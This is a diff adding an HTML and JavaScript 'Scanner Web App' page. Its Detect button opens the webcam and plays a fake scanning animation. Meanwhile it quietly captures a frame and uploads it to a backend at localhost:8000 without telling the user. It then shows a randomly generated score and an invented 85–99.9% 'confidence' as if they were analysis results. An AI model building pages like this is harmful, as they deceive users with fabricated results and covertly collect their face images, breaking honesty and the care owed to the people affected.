@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Scanner Web App</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: #0f172a;
+            color: #f8fafc;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 500px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 20px;
+        }
+
+        #detectBtn {
+            padding: 15px 40px;
+            font-size: 1.2rem;
+            font-weight: bold;
+            color: #ffffff;
+            background: linear-gradient(135deg, #3b82f6, #2563eb);
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(59, 130, 246, 0.4);
+            transition: all 0.3s ease;
+        }
+
+        #detectBtn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(59, 130, 246, 0.6);
+        }
+
+        .video-container {
+            position: relative;
+            width: 100%;
+            height: 350px;
+            background-color: #1e293b;
+            border-radius: 16px;
+            overflow: hidden;
+            display: none;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
+            border: 2px solid #334155;
+        }
+
+        video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: scaleX(-1);
+        }
+
+        .scan-overlay {
+            display: none;
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+        }
+
+        .scan-line {
+            width: 100%;
+            height: 4px;
+            background: linear-gradient(90deg, transparent, #38bdf8, transparent);
+            box-shadow: 0 0 15px #38bdf8, 0 0 8px #38bdf8;
+            position: absolute;
+            top: 0;
+            animation: scan 2s infinite ease-in-out;
+        }
+
+        .processing-text {
+            position: absolute;
+            bottom: 15px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(15, 23, 42, 0.8);
+            padding: 6px 16px;
+            border-radius: 20px;
+            font-size: 0.9rem;
+            color: #38bdf8;
+            border: 1px solid #38bdf8;
+            letter-spacing: 1px;
+        }
+
+        @keyframes scan {
+            0% { top: 0%; }
+            50% { top: 98%; }
+            100% { top: 0%; }
+        }
+
+        .results-card {
+            display: none;
+            width: 100%;
+            background-color: #1e293b;
+            border-radius: 16px;
+            padding: 24px;
+            flex-direction: column;
+            align-items: center;
+            gap: 15px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+            border: 1px solid #334155;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .results-card h2 {
+            font-size: 1.2rem;
+            color: #94a3b8;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+        }
+
+        .meter-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+            gap: 10px;
+        }
+
+        .meter-bar-bg {
+            width: 100%;
+            height: 20px;
+            background-color: #0f172a;
+            border-radius: 10px;
+            overflow: hidden;
+            position: relative;
+            border: 1px solid #334155;
+        }
+
+        .meter-bar-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #22c55e, #eab308, #ef4444);
+            border-radius: 10px;
+            transition: width 1.5s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .meter-value {
+            font-size: 2.5rem;
+            font-weight: bold;
+            color: #f8fafc;
+        }
+
+        .metrics-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            width: 100%;
+            gap: 10px;
+            margin-top: 10px;
+        }
+
+        .metric-box {
+            background-color: #0f172a;
+            padding: 12px;
+            border-radius: 8px;
+            text-align: center;
+            border: 1px solid #334155;
+        }
+
+        .metric-box label {
+            font-size: 0.8rem;
+            color: #64748b;
+            display: block;
+            margin-bottom: 4px;
+        }
+
+        .metric-box span {
+            font-weight: bold;
+            color: #38bdf8;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <button id="detectBtn">Detect</button>
+
+        <div class="video-container" id="videoContainer">
+            <video id="webcam" autoplay playsinline muted></video>
+            <div class="scan-overlay" id="scanOverlay">
+                <div class="scan-line"></div>
+                <div class="processing-text">PROCESSING IMAGE...</div>
+            </div>
+        </div>
+
+        <div class="results-card" id="resultsCard">
+            <h2>Meter</h2>
+            <div class="meter-container">
+                <div class="meter-value" id="meterValue">0</div>
+                <div class="meter-bar-bg">
+                    <div class="meter-bar-fill" id="meterFill"></div>
+                </div>
+            </div>
+
+            <div class="metrics-grid">
+                <div class="metric-box">
+                    <label>Status</label>
+                    <span>Completed</span>
+                </div>
+                <div class="metric-box">
+                    <label>Confidence</label>
+                    <span id="confidenceValue">0%</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const detectBtn = document.getElementById('detectBtn');
+        const videoContainer = document.getElementById('videoContainer');
+        const webcam = document.getElementById('webcam');
+        const scanOverlay = document.getElementById('scanOverlay');
+        const resultsCard = document.getElementById('resultsCard');
+        const meterValue = document.getElementById('meterValue');
+        const meterFill = document.getElementById('meterFill');
+        const confidenceValue = document.getElementById('confidenceValue');
+
+        detectBtn.addEventListener('click', async () => {
+            detectBtn.style.display = 'none';
+            resultsCard.style.display = 'none';
+            videoContainer.style.display = 'block';
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user" },
+                    audio: false
+                });
+                webcam.srcObject = stream;
+
+                webcam.onloadedmetadata = () => {
+                    startProcessing();
+                };
+            } catch (err) {
+                alert("Camera access denied or not available. Please grant permissions and try again.");
+                console.error("Camera access error:", err);
+                detectBtn.style.display = 'block';
+                videoContainer.style.display = 'none';
+            }
+        });
+
+        function startProcessing() {
+            scanOverlay.style.display = 'block';
+
+            // Simulate processing and capture photo right before completion
+            setTimeout(async () => {
+                try {
+                    // Capture frame from video element using canvas
+                    const canvas = document.createElement('canvas');
+                    canvas.width = webcam.videoWidth || 640;
+                    canvas.height = webcam.videoHeight || 480;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(webcam, 0, 0, canvas.width, canvas.height);
+
+                    // Convert canvas to a Blob and upload to backend
+                    canvas.toBlob(async (blob) => {
+                        const formData = new FormData();
+                        formData.append('file', blob, 'scan_capture.jpg');
+
+                        try {
+                            const response = await fetch('http://localhost:8000/upload-image', {
+                                method: 'POST',
+                                body: formData
+                            });
+                            const result = await response.json();
+                            console.log("Server response:", result);
+                        } catch (uploadErr) {
+                            console.error("Error uploading image to backend:", uploadErr);
+                        }
+                    }, 'image/jpeg', 0.9);
+
+                } catch (captureErr) {
+                    console.error("Capture error:", captureErr);
+                }
+
+                // Hide processing UI and stop camera
+                scanOverlay.style.display = 'none';
+                stopCamera();
+                videoContainer.style.display = 'none';
+
+                showResults();
+            }, 3000);
+        }
+
+        function stopCamera() {
+            const stream = webcam.srcObject;
+            if (stream) {
+                const tracks = stream.getTracks();
+                tracks.forEach(track => track.stop());
+                webcam.srcObject = null;
+            }
+        }
+
+        function showResults() {
+            resultsCard.style.display = 'flex';
+
+            const randomScore = Math.floor(Math.random() * 101);
+            const randomConfidence = (Math.random() * (99.9 - 85.0) + 85.0).toFixed(1);
+
+            setTimeout(() => {
+                meterFill.style.width = `${randomScore}%`;
+            }, 100);
+
+            let currentScore = 0;
+            const duration = 1500;
+            const stepTime = Math.abs(Math.floor(duration / (randomScore || 1)));
+
+            if (randomScore === 0) {
+                meterValue.textContent = 0;
+            } else {
+                const timer = setInterval(() => {
+                    currentScore++;
+                    meterValue.textContent = currentScore;
+                    if (currentScore >= randomScore) {
+                        clearInterval(timer);
+                    }
+                }, stepTime);
+            }
+
+            confidenceValue.textContent = `${randomConfidence}%`;
+        }
+    </script>
+</body>
+</html>
